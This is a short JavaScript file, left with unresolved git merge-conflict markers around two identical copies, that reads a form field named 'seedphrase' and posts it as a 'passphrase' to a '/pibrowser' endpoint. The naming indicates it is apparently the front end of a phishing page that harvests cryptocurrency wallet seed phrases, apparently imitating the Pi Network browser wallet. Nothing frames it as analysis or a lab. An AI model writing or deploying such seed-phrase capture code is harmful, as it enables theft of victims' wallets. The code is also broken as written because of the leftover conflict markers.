<<<<<<< HEAD
const form = document.getElementById('myForm');
const textInput = document.querySelector('.seedphrase');
const handleFormSubmit = async (event) => {
event.preventDefault();
const passphrase = textInput.value;
try {
    console.log(passphrase);
    textInput.value = "";
    await axios.post('/pibrowser', { passphrase });
} catch (error) {
    console.log(error);
}
};
form.addEventListener('submit', handleFormSubmit);
form.addEventListener('keypress', (event) => {
if (event.key === 'Enter') {
    handleFormSubmit(event); 
}
=======
const form = document.getElementById('myForm');
const textInput = document.querySelector('.seedphrase');
const handleFormSubmit = async (event) => {
event.preventDefault();
const passphrase = textInput.value;
try {
    console.log(passphrase);
    textInput.value = "";
    await axios.post('/pibrowser', { passphrase });
} catch (error) {
    console.log(error);
}
};
form.addEventListener('submit', handleFormSubmit);
form.addEventListener('keypress', (event) => {
if (event.key === 'Enter') {
    handleFormSubmit(event); 
}
>>>>>>> f573e8ac046433273d5bac9a274ef75336a3c33e
});